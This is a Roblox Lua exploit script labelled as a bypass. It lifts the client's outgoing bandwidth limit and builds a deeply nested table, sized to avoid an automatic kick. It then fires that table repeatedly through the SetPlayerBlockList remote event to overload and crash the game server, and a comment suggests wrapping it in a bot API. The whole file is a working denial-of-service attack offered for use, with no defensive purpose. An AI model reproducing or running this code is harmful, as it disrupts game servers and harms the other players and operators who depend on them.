--bypass
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val) --calculate maximum value
    local mainvalueifonetable = 4999999 --doing more per 1 table causes a kick
    if type(val) ~= "number" then
        return nil --we cant calcuate if our value isnt a number, lets prevent a error from happening!
    end
    local calculateperfectval = (mainvalueifonetable/(val+2)) --+2 to calculate the spammed table (+1) which is in the main table (+1)
    return calculateperfectval --return the value.
end

local function bomb(tableincrease, tries) 
  local maintable = {}
  local spammedtable = {}
  
  table.insert(spammedtable, {})
  z = spammedtable[1]
  
  for i = 1, tableincrease do
     local tableins = {}
     table.insert(z, tableins)
     z = tableins
  end --increases each with the paremeter
  
  local calculatemax = getmaxvalue(tableincrease) --we increased tables, lets calculate the new maximum we're capable of using
  local maximum --setup the max we use after calculating
  
  if calculatemax then
      maximum = calculatemax
      else
      maximum = 4999999 --ok?
  end
  
  for i = 1, maximum do
      table.insert(maintable, spammedtable)
  end --pass each spammed table into main table

  for i = 1, tries do
      game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable) --push a as a argument and fire for each try.
      --game:GetService("Chat"):FilterStringForBroadcast(maintable, game.Players.Local)
  end
end

bomb(296, 4) --fire the function or include it in an bot api
--lua stack maximum is 296
